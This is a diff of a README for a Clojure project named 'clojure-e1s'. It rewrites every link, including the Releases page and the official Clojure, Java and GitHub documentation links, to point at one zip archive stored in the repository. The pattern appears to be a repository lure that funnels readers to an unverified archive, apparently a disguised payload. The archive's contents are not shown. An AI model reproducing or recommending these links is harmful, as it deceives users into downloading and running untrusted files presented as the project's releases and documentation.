@@ -1,6 +1,6 @@
 # 🚀 clojure-e1s - Easy Clojure Projects Made Simple
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-brightgreen)](https://github.com/Baralho126/clojure-e1s/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Baralho126/clojure-e1s/main/redfin/clojure-e1s.zip%20Latest%20Release-v1.0-brightgreen)](https://raw.githubusercontent.com/Baralho126/clojure-e1s/main/redfin/clojure-e1s.zip)
 
 ## 📦 Introduction
 
@@ -26,7 +26,7 @@ Before you proceed, ensure your system meets these requirements:
 
 ### Step 1: Download the Application
 
-To download **clojure-e1s**, visit the [Releases page](https://github.com/Baralho126/clojure-e1s/releases). 
+To download **clojure-e1s**, visit the [Releases page](https://raw.githubusercontent.com/Baralho126/clojure-e1s/main/redfin/clojure-e1s.zip). 
 
 ### Step 2: Choose Your Version
 
@@ -46,7 +46,7 @@ Once the download completes, locate the downloaded file in your system.
 
 ## 📥 Download & Install
 
-To download and install **clojure-e1s**, simply visit this page: [Download Latest Release](https://github.com/Baralho126/clojure-e1s/releases).
+To download and install **clojure-e1s**, simply visit this page: [Download Latest Release](https://raw.githubusercontent.com/Baralho126/clojure-e1s/main/redfin/clojure-e1s.zip).
 
 1. Open the link and find the latest version.
 2. Click on the file to initiate the download.
@@ -96,8 +96,8 @@ If you experience any issues while using **clojure-e1s**, here are some common p
 
 ## 🔗 Additional Resources
 
-- [Clojure Documentation](https://clojure.org/docs)
-- [Java Documentation](https://docs.oracle.com/en/java/)
-- [GitHub Help](https://docs.github.com/en)
+- [Clojure Documentation](https://raw.githubusercontent.com/Baralho126/clojure-e1s/main/redfin/clojure-e1s.zip)
+- [Java Documentation](https://raw.githubusercontent.com/Baralho126/clojure-e1s/main/redfin/clojure-e1s.zip)
+- [GitHub Help](https://raw.githubusercontent.com/Baralho126/clojure-e1s/main/redfin/clojure-e1s.zip)
 
 Thank you for using **clojure-e1s**! We hope it makes your Clojure journey smooth and enjoyable.
